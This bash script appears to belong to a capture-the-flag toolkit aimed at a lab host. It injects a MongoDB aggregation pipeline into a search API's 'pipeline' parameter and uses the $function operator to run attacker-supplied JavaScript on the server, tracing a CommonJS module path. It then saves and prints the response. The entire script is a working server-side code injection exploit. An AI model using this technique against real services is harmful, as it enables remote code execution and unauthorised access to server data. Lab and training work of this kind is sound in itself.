#!/usr/bin/env bash
set -o pipefail

source "$(dirname -- "${BASH_SOURCE[0]}")/common.sh"

(( $# == 2 )) || {
  printf 'Usage: %s LABEL MODULE_PATH\n' "$0" >&2
  exit 2
}

label="$1"
module_path="$2"
[[ "$label" =~ ^[A-Za-z0-9._-]+$ ]] || exit 2
[[ "$module_path" =~ ^/[A-Za-z0-9._/@-]+$ ]] || exit 2

base='http://aegis.korvia.htb:3000/api/v1/aegis-mds/search'
body="$odyssey_root/responses/cjs-trace-$label.body"
headers="$odyssey_root/responses/cjs-trace-$label.headers"
js_body=$(<"$odyssey_root/artifacts/trace-commonjs-module.js")
pipeline=$(jq -cn --arg body "$js_body" --arg path "$module_path" \
  '[{"$limit":1},{"$project":{"_id":0,"probe":{"$function":{"body":$body,"args":[$path],"lang":"js"}}}}]')

curl --connect-timeout 5 --max-time 30 -sS -G \
  -D "$headers" -o "$body" \
  --data-urlencode "pipeline=$pipeline" "$base"

awk 'NR==1{print "status=" $2}' "$headers"
jq . "$body"
